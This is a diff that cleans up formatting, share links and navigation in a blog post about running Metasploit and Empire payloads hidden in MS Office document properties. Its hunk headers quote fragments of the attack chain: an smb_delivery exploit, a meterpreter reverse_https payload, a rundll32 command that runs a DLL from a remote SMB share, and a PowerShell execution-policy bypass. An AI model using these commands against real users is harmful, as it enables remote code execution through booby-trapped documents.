@@ -41,11 +41,10 @@ use exploit/windows/smb/smb_delivery
 
 
 
-* *
 
 
 
-* [![](/wp-content/uploads/2017/12/ks-msf1.jpg)](/wp-content/uploads/2017/12/ks-msf1.jpg)*
+[![](/wp-content/uploads/2017/12/ks-msf1.jpg)](/wp-content/uploads/2017/12/ks-msf1.jpg)
 
 
 
@@ -66,7 +65,6 @@ set PAYLOAD windows/meterpreter/reverse_https
 
 
 
-* *
 
 
 
@@ -103,7 +101,6 @@ rundll32.exe \\192.168.0.11\PPuUdw\test.dll,0
 
 
 
-* *
 
 
 
@@ -128,7 +125,6 @@ powershell.exe -exec bypass
 
 
 
-* *
 
 
 
@@ -145,7 +141,6 @@ Import-Module .\Commentator.ps1
 
 
 
-* *
 
 
 
@@ -162,11 +157,9 @@ Invoke-Commentator -OfficeFile .\msf_smb_delivery.xlsx -Comment "rundll32.exe \\
 
 
 
-* *
 
 
 
-* *
 
 
 
@@ -198,7 +191,6 @@ Lastly, in order to execute the payload embedded within the ‘comments’ prope
 
 
 
-* *
 
 
 ```
@@ -243,15 +235,4 @@ After the victim has clicked ‘enable editing’ and ‘enable content’, a Me
 
 
 
-* [![](/wp-content/uploads/2017/12/ks-msf6.jpg)](/wp-content/uploads/2017/12/ks-msf6.jpg)*
-
-
-### About The Author
-
-
- -  [](/)
-
-       [**](https://www.facebook.com/sharer.php?u=/executing-metasploit-empire-payloads-from-ms-office-document-properties-part-1-of-2/) [**](http://twitter.com/share?url=/executing-metasploit-empire-payloads-from-ms-office-document-properties-part-1-of-2/&text=Executing%20Metasploit%20%26%20Empire%20Payloads%20from%20MS%20Office%20Document%20Properties%20%28part%201%20of%202%29) [**](mailto:?subject=Executing%20Metasploit%20%26amp;%20Empire%20Payloads%20from%20MS%20Office%20Document%20Properties%20(part%201%20of%202)&body=/executing-metasploit-empire-payloads-from-ms-office-document-properties-part-1-of-2/) [**](https://www.linkedin.com/sharing/share-offsite/?url=/executing-metasploit-empire-payloads-from-ms-office-document-properties-part-1-of-2/&title=Executing%20Metasploit%20%26%20Empire%20Payloads%20from%20MS%20Office%20Document%20Properties%20%28part%201%20of%202%29) [**](javascript:pinIt();) [**](https://t.me/share/url?url=/executing-metasploit-empire-payloads-from-ms-office-document-properties-part-1-of-2/&title=Executing%20Metasploit%20%26%20Empire%20Payloads%20from%20MS%20Office%20Document%20Properties%20%28part%201%20of%202%29) [**](https://api.whatsapp.com/send?text=/executing-metasploit-empire-payloads-from-ms-office-document-properties-part-1-of-2/&title=Executing%20Metasploit%20%26%20Empire%20Payloads%20from%20MS%20Office%20Document%20Properties%20%28part%201%20of%202%29) [**](https://www.reddit.com/submit?url=/executing-metasploit-empire-payloads-from-ms-office-document-properties-part-1-of-2/&title=Executing%20Metasploit%20%26%20Empire%20Payloads%20from%20MS%20Office%20Document%20Properties%20%28part%201%20of%202%29) [**](javascript:window.print())    
-## Post navigation
-
- [Reporting SSL/TLS Issues the Easy Way with YANP](/posts/reporting-ssltls-issues-the-easy-way-with-yanp/)[Executing Metasploit & Empire Payloads from MS Office Document Properties (part 2 of 2)](/posts/executing-metasploit-empire-payloads-from-ms-office-document-properties-part-2-of-2/)
+[![](/wp-content/uploads/2017/12/ks-msf6.jpg)](/wp-content/uploads/2017/12/ks-msf6.jpg)
